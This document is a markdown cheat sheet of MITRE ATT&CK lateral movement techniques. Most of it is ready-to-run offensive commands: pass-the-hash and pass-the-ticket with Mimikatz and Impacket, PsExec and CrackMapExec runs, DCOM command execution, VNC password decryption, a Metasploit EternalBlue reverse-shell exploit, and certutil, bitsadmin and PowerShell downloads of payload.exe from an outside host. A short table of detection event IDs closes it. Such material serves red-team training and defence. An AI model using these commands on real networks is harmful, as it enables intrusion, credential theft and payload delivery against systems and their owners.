# MITRE ATT&ACK: Lateral Movement (TA0008)

> Techniques to enter and control remote systems on a network.

---

## T1021: Remote Services

### T1021.001: Remote Desktop Protocol (RDP)
```powershell
# Enable RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=tcp localport=3389

# Connect
mstsc /v:target.com
xfreerdp /u:admin /p:password /v:target.com
```

### T1021.002: SMB/Windows Admin Shares
```bash
# Copy file to admin share
smbclient //target/C$ -U administrator -c "put payload.exe windows\temp\payload.exe"

# PSExec
psexec.exe \\target -u administrator -p password -s cmd.exe

# CrackMapExec
crackmapexec smb 10.0.0.0/24 -u admin -p password -x "whoami"

# Pass-the-Hash with SMB
python psexec.py -hashes :[NTLM_HASH] administrator@target.com
```

### T1021.003: Distributed Component Object Model (DCOM)
```powershell
# Execute command via DCOM
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target.com"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

### T1021.004: SSH
```bash
# SSH with key
ssh -i id_rsa user@target.com

# SSH tunnel
ssh -L 8080:localhost:80 user@target.com
ssh -R 9090:localhost:8080 user@target.com

# SSH proxy
ssh -D 1080 user@target.com
```

### T1021.005: VNC
```bash
# VNC password cracking
cat password.vnc | xxd -r -p | openssl enc -des-cbc -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
```

### T1021.006: WinRM/Windows Remote Management
```powershell
# Enable WinRM
Enable-PSRemoting -Force

# Execute remote command
Invoke-Command -ComputerName target.com -ScriptBlock { whoami } -Credential $cred

# Enter-PSSession
Enter-PSSession -ComputerName target.com -Credential $cred

# Evil-WinRM
evil-winrm -i target.com -u administrator -p password
```

---

## T1210: Exploitation of Remote Services

- **EternalBlue** (MS17-010): SMBv1 exploit for remote code execution
- **BlueKeep** (CVE-2019-0708): RDP vulnerability
- **Zerologon** (CVE-2020-1472): Netlogon elevation of privilege
- **PrintNightmare** (CVE-2021-34527): Windows Print Spooler RCE

```bash
# Metasploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
exploit

# Zerologon
python zerologon.py dc01 10.0.0.1
```

---

## T1550: Use Alternate Authentication Material

### T1550.002: Pass the Hash
```bash
# Mimikatz
sekurlsa::pth /user:administrator /domain:corp.com /ntlm:7c4a8d09ca3762af61e59520943dc264

# Impacket
python psexec.py -hashes :[NTLM_HASH] administrator@target.com
python wmiexec.py -hashes :[NTLM_HASH] administrator@target.com
python smbexec.py -hashes :[NTLM_HASH] administrator@target.com
python atexec.py -hashes :[NTLM_HASH] administrator@target.com

# CrackMapExec with hash
crackmapexec smb 10.0.0.0/24 -u admin -H [NTLM_HASH]
```

### T1550.003: Pass the Ticket
```bash
# Mimikatz - inject ticket
kerberos::ptt ticket.kirbi

# Export and inject TGS
mimikatz # kerberos::list /export
mimikatz # kerberos::ptt cifs_target.com.kirbi
```

---

## T1570: Lateral Tool Transfer

```bash
# SMB file copy
smbclient //target/C$ -U admin -c "put mimikatz.exe windows\temp\m.exe"

# PowerShell remoting file transfer
$session = New-PSSession -ComputerName target.com
Copy-Item -Path "C:\temp\payload.exe" -Destination "C:\windows\temp\payload.exe" -ToSession $session

# Certutil download
 certutil -urlcache -split -f http://10.0.0.5/payload.exe C:\temp\payload.exe

# BitsAdmin
bitsadmin /transfer job /download /priority high http://10.0.0.5/payload.exe C:\temp\payload.exe

# PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.0.0.5/payload.exe','C:\temp\payload.exe')"
```

---

## Detection

| Technique | Detection |
|---|---|
| RDP Lateral Movement | Event ID 4624 (Type 10), 4625, 4648 |
| SMB/PSExec | Event ID 5140, 4688 (psexesvc.exe), Sysmon 1 |
| Pass-the-Hash | Event ID 4624 (Type 3, NTLM, no pre-auth) |
| WinRM | Event ID 91 (WinRM operational) |
| DCOM | Event ID 10001 (DCOM operational) |
| Pass-the-Ticket | Event ID 4769 (unusual TGS requests) |
